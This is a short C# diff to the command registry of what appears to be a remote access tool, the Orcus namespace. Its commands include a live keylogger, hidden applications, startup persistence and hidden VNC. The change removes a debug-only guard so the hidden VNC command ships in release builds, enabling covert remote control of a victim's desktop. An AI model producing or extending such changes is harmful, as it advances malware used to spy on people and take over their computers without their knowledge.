@@ -73,9 +73,7 @@ namespace Orcus.CommandManagement
                 new LivePerformanceCommand(),
                 new TextChatCommand(),
                 new UserInteractionCommand(),
-#if DEBUG
                 new HvncCommand(),
-#endif
                 new LiveKeyloggerCommand(),
                 new HiddenApplicationCommand(),
                 new StartupManagerCommand(),
